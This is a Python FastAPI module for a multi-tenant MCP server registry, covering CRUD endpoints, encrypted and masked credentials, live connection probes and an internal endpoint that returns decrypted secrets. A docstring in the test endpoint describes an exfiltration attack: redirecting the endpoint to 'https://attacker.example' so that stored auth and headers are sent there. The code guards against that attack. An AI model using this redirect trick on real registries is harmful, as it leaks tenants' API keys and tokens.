"""MCP server CRUD endpoints (tenant-scoped) + internal cross-tenant read."""

from __future__ import annotations

import asyncio
from typing import Any

from fastapi import APIRouter, Depends, Response, status
from sqlalchemy.ext.asyncio import AsyncSession

from mcp_registry.api.authz_guard import require_permission
from mcp_registry.api.dependencies import (
    TDbSession,
    TInternalAuth,
    TTenantId,
    internal_db_session,
)
from mcp_registry.config import Settings
from mcp_registry.errors import MaskedValueNotStoredError
from mcp_registry.schemas.common import ListPage
from mcp_registry.schemas.mcp_server import (
    McpProbeRequest,
    McpServerCreate,
    McpServerOut,
    McpServerTestOverride,
    McpServerUpdate,
    McpTestResult,
)
from mcp_registry.services.registry_service import RegistryService
from mcp_registry.services.secret_crypto import (
    MASKED_SENTINEL,
    _secret_fields_for,
    decrypt_auth,
    decrypt_values,
    encrypt_auth,
    encrypt_values,
    has_secret,
    mask_auth,
    mask_values,
    masked_keys,
)
from mcp_registry.services.server_tester import test_connection

router = APIRouter(tags=["MCPServers"])


def _crypto_ctx(tenant_id: str) -> dict[str, Any]:
    """Bind the crypto settings + tenant for encrypt/decrypt calls."""
    settings = Settings()
    return {
        "crypto_url": settings.crypto_url,
        "timeout": settings.crypto_timeout,
        "tenant_id": tenant_id,
    }


def _encrypt_ctx(tenant_id: str) -> dict[str, Any]:
    """``_crypto_ctx`` plus the dev-only plaintext fallback, for encrypt calls."""
    return {**_crypto_ctx(tenant_id), "allow_plaintext": Settings().allow_plaintext_secrets}


async def _revealed(server: Any, tenant_id: str) -> McpServerOut:
    """Validate to McpServerOut with ``auth``, ``env`` and ``headers`` decrypted."""
    out = McpServerOut.model_validate(server)
    ctx = _crypto_ctx(tenant_id)
    out.auth, out.env, out.headers = await asyncio.gather(
        decrypt_auth(out.auth, **ctx),
        decrypt_values(out.env, **ctx),
        decrypt_values(out.headers, **ctx),
    )
    return out


def _masked(server: Any) -> McpServerOut:
    """Admin view: auth secret fields and every ``env`` / ``headers`` value masked.

    Used by the tenant-facing admin surface (GET/list/create/PATCH) so stored
    credentials never reach the browser.  Masking only needs to know whether a
    value is set, so nothing is decrypted here.  Map keys and the non-secret
    auth fields (header_name, client_id, token_url, scopes) pass through
    unchanged.
    """
    out = McpServerOut.model_validate(server)
    out.auth = mask_auth(out.auth)
    out.env = mask_values(out.env)
    out.headers = mask_values(out.headers)
    return out


async def _serialize_internal(server: Any, tenant_id: str) -> dict[str, Any]:
    """Plaintext view for the internal consumer endpoint.

    DB stores envelope-encrypted secrets; the internal consumer endpoint
    surfaces plaintext so consumers (mcp_tenant_injector, worker, tool-broker)
    never touch envelopes.
    """
    return (await _revealed(server, tenant_id)).model_dump(mode="json")


def _serialize_masked(server: Any) -> dict[str, Any]:
    return _masked(server).model_dump(mode="json")


async def _merge_masked_values(
    field: str, submitted: dict[str, Any], stored: dict[str, Any] | None, tenant_id: str,
) -> dict[str, Any]:
    """Build the ``env`` / ``headers`` map a PATCH stores.

    The submitted map replaces the stored one, so a key it omits is dropped.
    A ``MASKED_SENTINEL`` value is the admin form echoing a value it was only
    ever shown masked: it means "unchanged", and that key keeps its stored
    value byte for byte (no crypto call).  Every other value is newly typed
    plaintext and is encrypted.
    """
    stored = stored or {}
    unknown = [key for key in masked_keys(submitted) if not stored.get(key)]
    if unknown:
        # Storing the sentinel itself, or silently dropping the key, would
        # both corrupt the config - make the admin type the value instead.
        raise MaskedValueNotStoredError(field, unknown)
    fresh = await encrypt_values(
        {key: value for key, value in submitted.items() if value != MASKED_SENTINEL},
        **_encrypt_ctx(tenant_id),
    )
    return {
        key: stored[key] if value == MASKED_SENTINEL else fresh[key]
        for key, value in submitted.items()
    }


@router.get("/mcp-servers", response_model=ListPage,
            dependencies=[Depends(require_permission("mcp_server.read", "mcp_server"))])
async def list_servers(
    db: AsyncSession = TDbSession,
    tenant_id: str = TTenantId,
) -> ListPage:
    svc = RegistryService(db, tenant_id=tenant_id)
    items = await svc.list_servers()
    payload = [_serialize_masked(s) for s in items]
    return ListPage(items=payload, total=len(payload))


@router.post(
    "/mcp-servers",
    status_code=status.HTTP_201_CREATED,
    response_model=McpServerOut,
    dependencies=[Depends(require_permission("mcp_server.create", "mcp_server"))],
)
async def create_server(
    body: McpServerCreate,
    db: AsyncSession = TDbSession,
    tenant_id: str = TTenantId,
) -> McpServerOut:
    svc = RegistryService(db, tenant_id=tenant_id)
    plain_auth = body.auth.model_dump(exclude_none=True) if body.auth else None
    ctx = _encrypt_ctx(tenant_id)
    encrypted_auth, env, headers = await asyncio.gather(
        encrypt_auth(plain_auth, **ctx),
        encrypt_values(body.env, **ctx),
        encrypt_values(body.headers, **ctx),
    )
    server = await svc.create(
        name=body.name,
        transport=body.transport.value,
        endpoint=body.endpoint,
        command=body.command,
        env=env,
        enabled=body.enabled,
        headers=headers,
        auth=encrypted_auth,
        timeout_seconds=body.timeout_seconds,
        tool_filter=body.tool_filter.model_dump(),
        args=body.args,
    )
    return _masked(server)


# NOTE: declared *before* the ``/mcp-servers/{server_id}`` routes below so the
# literal ``probe`` segment can never be captured as a ``server_id`` — Starlette
# matches routes in declaration order.
@router.post(
    "/mcp-servers/probe",
    response_model=McpTestResult,
    dependencies=[Depends(require_permission("mcp_server.create", "mcp_server"))],
)
async def probe_server(body: McpProbeRequest) -> McpTestResult:
    """Live-probe an *unsaved* MCP server config (initialize + tools/list).

    The admin console builds its tool allow/block picker from the upstream's
    real tool list, which it needs on the create form (no ``server_id`` exists
    yet) as well as the edit form.  This endpoint takes the connection config
    straight from the request body and runs the same handshake as
    ``/mcp-servers/{id}/test``.

    ``auth`` here is the plaintext the admin just typed — it has never been
    encrypted, so no ``decrypt_auth`` runs on this path.

    Guarded by the *write* permission (``mcp_server.create``), not the read
    one: the endpoint makes the server issue an outbound request to a
    caller-supplied URL, which is not something a read-only role should be able
    to trigger.

    Like the ``/test`` endpoint, this never raises — every failure (bad
    transport, unreachable upstream, JSON-RPC error) comes back as
    ``ok=false`` with an ``error`` string.
    """
    view = _ServerView(
        transport=body.transport.value,
        endpoint=body.endpoint,
        headers=body.headers,
        auth=body.auth.model_dump(exclude_none=True) if body.auth else None,
        timeout_seconds=body.timeout_seconds,
    )
    try:
        return await test_connection(view)
    except Exception as exc:  # noqa: BLE001 - probe must never raise
        return McpTestResult(ok=False, error=f"unexpected error: {exc}")


@router.get("/mcp-servers/{server_id}", response_model=McpServerOut,
            dependencies=[Depends(require_permission("mcp_server.read", "mcp_server"))])
async def get_server(
    server_id: str,
    db: AsyncSession = TDbSession,
    tenant_id: str = TTenantId,
) -> McpServerOut:
    svc = RegistryService(db, tenant_id=tenant_id)
    return _masked(await svc.get(server_id))


@router.patch("/mcp-servers/{server_id}", response_model=McpServerOut,
              dependencies=[Depends(require_permission("mcp_server.update", "mcp_server"))])
async def update_server(
    server_id: str,
    body: McpServerUpdate,
    db: AsyncSession = TDbSession,
    tenant_id: str = TTenantId,
) -> McpServerOut:
    svc = RegistryService(db, tenant_id=tenant_id)
    # The stored row resolves masked sentinels ("unchanged") in auth / env /
    # headers below; fetching it first also 404s before any crypto work.
    existing = await svc.get(server_id)
    changes = body.model_dump(exclude_none=True)
    if "transport" in changes:
        changes["transport"] = changes["transport"].value if hasattr(
            changes["transport"], "value",
        ) else changes["transport"]
    if "auth" in changes:
        # ``body.auth`` is a validated McpAuthConfig; re-dump to get the
        # canonical dict (drops None fields) before encrypting secrets.
        auth_dict = body.auth.model_dump(exclude_none=True) if body.auth else None
        if auth_dict:
            # When the admin edits non-secret fields (timeout, tool_filter)
            # without retyping the secret, the frontend sends the masked
            # sentinel back.  Detect it and preserve the stored (encrypted)
            # value so the real secret is never lost.
            stored_auth = existing.auth or {}
            for field in _secret_fields_for(auth_dict):
                if auth_dict.get(field) == MASKED_SENTINEL:
                    # Keep the stored envelope-encrypted value as-is.
                    auth_dict[field] = stored_auth.get(field, "")
            # encrypt_auth is idempotent on envelopes (is_envelope → pass
            # through), so the preserved stored values survive unchanged
            # while newly typed plaintext values get encrypted.
            changes["auth"] = await encrypt_auth(auth_dict, **_encrypt_ctx(tenant_id))
        else:
            changes["auth"] = await encrypt_auth(auth_dict, **_encrypt_ctx(tenant_id))
    for field in ("env", "headers"):
        if field in changes:
            changes[field] = await _merge_masked_values(
                field, changes[field], getattr(existing, field), tenant_id,
            )
    server = await svc.update(server_id, **changes)
    return _masked(server)


@router.delete("/mcp-servers/{server_id}", status_code=204,
               dependencies=[Depends(require_permission("mcp_server.delete", "mcp_server"))])
async def delete_server(
    server_id: str,
    db: AsyncSession = TDbSession,
    tenant_id: str = TTenantId,
) -> Response:
    svc = RegistryService(db, tenant_id=tenant_id)
    await svc.delete(server_id)
    return Response(status_code=204)


@router.post(
    "/mcp-servers/{server_id}/test",
    response_model=McpTestResult,
    dependencies=[Depends(require_permission("mcp_server.read", "mcp_server"))],
)
async def test_server(
    server_id: str,
    body: McpServerTestOverride | None = None,
    db: AsyncSession = TDbSession,
    tenant_id: str = TTenantId,
) -> McpTestResult:
    """Live-test a configured MCP server by performing the real handshake.

    HTTP servers get a full ``initialize`` + ``notifications/initialized`` +
    ``tools/list`` round-trip against the upstream.  ``stdio`` servers are not
    reachable from this process and ``sse`` servers use the legacy dual-endpoint
    SSE transport that only the SDK worker path supports natively; both return a
    deterministic not-supported result.  The endpoint never raises - every
    failure is surfaced as ``ok=false`` with an ``error`` message.

    The request body is optional.  Absent (or ``{}``, which is what the BFF
    forwards when the client sends nothing) the stored config is probed
    unchanged; any field explicitly present overrides the stored value for this
    one probe, which lets the admin console re-probe unsaved edits against a
    server that already exists.  An overridden ``auth`` is plaintext from the
    form, so it skips the stored-secret decrypt entirely.

    Stored credentials are never sent to a *redirected* endpoint
    -------------------------------------------------------------
    The override semantics above are otherwise an exfiltration primitive: this
    route is gated on ``mcp_server.read`` (which the ordinary ``member`` role
    holds), so a caller who may only *view* a server could POST
    ``{"endpoint": "https://attacker.example"}`` with no ``auth`` / ``headers``
    and make the registry decrypt the tenant's stored secret and hand it to a
    URL of their choosing.  Stored ``headers`` leak identically - they routinely
    carry ``Authorization`` / ``X-API-Key``.

    So: when ``endpoint`` is explicitly overridden to something *different* from
    the stored one, stored credential material must not be reused.  The caller
    has to supply ``auth`` and ``headers`` explicitly; otherwise we return
    ``ok=false`` with an explanatory ``error`` **before** any handshake and
    before ``decrypt_auth`` runs, so the secret is never even in memory.
    Deliberately narrow, to keep the legitimate flows working:

      * an ``endpoint`` override *equal* to the stored value is not a redirect -
        the edit form sends the whole config back when only ``timeout_seconds``
        or ``tool_filter`` changed, and that must keep using stored auth;
      * a server with no auth secret and no stored headers has nothing to leak,
        so a redirect there is allowed through unchanged;
      * only the omitted half is required - explicit ``auth`` + explicit
        ``headers`` (the real "re-probe my unsaved edits" case) proceeds.

    Masked header values
    --------------------
    The admin surface shows every stored ``headers`` value as
    ``MASKED_SENTINEL``, and the edit form sends an untouched one back
    verbatim.  In a ``headers`` override the sentinel therefore stands for the
    value stored under that key.  It resolves (decrypted) only while the
    endpoint is not redirected: on a redirect it counts as reusing a stored
    header, exactly like omitting ``headers``, and is refused the same way.  A
    sentinel for a key with nothing stored is refused rather than sent upstream
    verbatim.
    """
    svc = RegistryService(db, tenant_id=tenant_id)
    server = await svc.get(server_id)
    overrides = body.model_dump(exclude_unset=True) if body is not None else {}
    kept_header_keys = masked_keys(overrides.get("headers"))

    # ``exclude_unset`` is what makes this safe to key on: a field the caller
    # never sent is absent from ``overrides`` entirely, so "omitted" cannot be
    # spoofed by sending an explicit null.
    endpoint_redirected = (
        body is not None
        and "endpoint" in overrides
        and bool(overrides["endpoint"])
        and overrides["endpoint"] != server.endpoint
    )
    if endpoint_redirected:
        # ``has_secret`` is a pure predicate over the stored auth shape - it
        # answers "is there a secret here" without decrypting anything.
        reuses_stored_auth = "auth" not in overrides and has_secret(server.auth)
        # Omitting ``headers`` reuses the whole stored map; a masked value
        # reuses the one stored under its key.
        reuses_stored_headers = (
            "headers" not in overrides and bool(server.headers)
        ) or bool(kept_header_keys)
        if reuses_stored_auth or reuses_stored_headers:
            # Never raise: this endpoint's contract is that every failure comes
            # back as ok=false + error, and the admin console relies on it.
            return McpTestResult(
                ok=False,
                error=(
                    "Saved credentials cannot be reused after changing the endpoint. "
                    "Re-enter the authentication details and request headers "
                    "(submit them explicitly empty if none are needed), then test again."
                ),
            )

    stored_headers: dict[str, Any] = server.headers or {}
    unknown = [key for key in kept_header_keys if not stored_headers.get(key)]
    if unknown:
        return McpTestResult(
            ok=False,
            error=f"No saved value for header {', '.join(unknown)}. "
            "Re-enter it, then test again.",
        )

    if body is not None and "auth" in overrides:
        # Plaintext straight from the admin form - never decrypted.
        auth = body.auth.model_dump(exclude_none=True) if body.auth else None
    else:
        # Decrypt secrets for the handshake without mutating the ORM-tracked row
        # (mutating ``server.auth`` would flush plaintext back to the DB on
        # commit).  ``decrypt_auth(None)`` short-circuits, so non-http
        # transports with no auth incur no crypto call; the transport
        # dispatcher in ``test_connection`` returns the not-supported result
        # before the auth is even read.
        auth = await decrypt_auth(server.auth, **_crypto_ctx(tenant_id))

    if "headers" in overrides:
        # Sent headers replace the stored ones even when empty or null: the
        # redirect guard above admits an explicit ``{}`` because it means "no
        # headers", so falling back to the stored map here would hand it to
        # the redirected endpoint.  Masked values (not redirected, checked
        # above) take the stored value for their key.
        headers = dict(overrides["headers"] or {})
        if kept_header_keys:
            headers.update(await decrypt_values(
                {key: stored_headers[key] for key in kept_header_keys},
                **_crypto_ctx(tenant_id),
            ))
    else:
        headers = await decrypt_values(server.headers, **_crypto_ctx(tenant_id))

    # ``exclude_unset`` distinguishes "field omitted" from "field sent as null";
    # an explicit null falls back to the stored value rather than blanking it.
    transport = (
        body.transport.value
        if body is not None and body.transport is not None
        else server.transport
    )
    view = _ServerView(
        transport=transport,
        endpoint=overrides.get("endpoint") or server.endpoint,
        headers=headers,
        auth=auth,
        timeout_seconds=overrides.get("timeout_seconds") or server.timeout_seconds,
    )
    result = await test_connection(view)
    # Persist the discovered tool list on a successful handshake so the admin
    # console list page can render the upstream's tool catalog from the DB
    # without re-probing every server on every page load.  Failures leave the
    # stored value untouched - a transient upstream error must not wipe the
    # last known-good catalog.  The id-less ``/probe`` endpoint stays a pure
    # read and never writes.
    if result.ok:
        tools_payload = [t.model_dump(mode="json") for t in result.tools]
        await svc.update(server_id, discovered_tools=tools_payload)
    return result


@router.get(
    "/internal/mcp-servers",
    response_model=ListPage,
    dependencies=[TInternalAuth],
)
async def internal_list(
    tenant_id: str,
    db: AsyncSession = Depends(internal_db_session),
) -> ListPage:
    """For mcp_tenant_injector - enabled MCP servers for ``tenant_id``.

    Returns decrypted auth so consumers inject plaintext secrets directly
    without any crypto dependency of their own.
    """
    svc = RegistryService(db, tenant_id=tenant_id)
    items = await svc.list_for_tenant(tenant_id)
    payload = [await _serialize_internal(s, tenant_id) for s in items]
    return ListPage(items=payload, total=len(payload))


class _ServerView:
    """Lightweight read-only view of an McpServer for the test handshake.

    ``test_connection`` reads ``transport`` to dispatch (sse/stdio -> not
    supported, http -> handshake); ``test_http_connection`` reads
    ``endpoint`` / ``headers`` / ``auth`` / ``timeout_seconds``.  This view
    lets us pass decrypted auth without mutating the ORM-tracked ``McpServer``
    row (which would flush plaintext back to the DB on session commit).
    """

    __slots__ = ("transport", "endpoint", "headers", "auth", "timeout_seconds")

    def __init__(
        self,
        *,
        transport: str,
        endpoint: str | None,
        headers: dict[str, str],
        auth: dict[str, Any] | None,
        timeout_seconds: int | None,
    ) -> None:
        self.transport = transport
        self.endpoint = endpoint
        self.headers = headers
        self.auth = auth
        self.timeout_seconds = timeout_seconds
